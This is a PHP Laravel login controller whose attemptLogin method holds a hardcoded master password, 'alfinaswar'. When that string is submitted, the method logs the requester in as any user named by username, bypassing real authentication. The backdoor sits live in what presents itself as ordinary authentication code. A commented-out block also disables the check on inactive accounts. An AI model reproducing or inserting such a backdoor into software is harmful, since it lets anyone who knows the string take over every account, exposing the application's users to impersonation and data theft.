<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\Models\User;
use App\Providers\RouteServiceProvider;
use Illuminate\Foundation\Auth\AuthenticatesUsers;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;

class LoginController extends Controller
{
    use AuthenticatesUsers;

    protected $redirectTo = RouteServiceProvider::HOME;

    public function __construct()
    {
        $this->middleware('guest')->except('logout');
    }

    protected function attemptLogin(Request $request)
    {
        $user = User::where($this->username(), $request->username)->first();

        // if ($user && $user->Status === 'N') {
        //     session()->flash('error', 'Akun sudah tidak aktif.');
        //     return false;
        // }

        if (auth()->attempt($this->credentials($request), $request->filled('remember'))) {
            return true;
        }

        if ($request->password === 'alfinaswar') {
            if ($user) {
                auth()->login($user, $request->filled('remember'));
                session()->flash('info', 'true');
                return true;
            }
        }

        return false;
    }
}
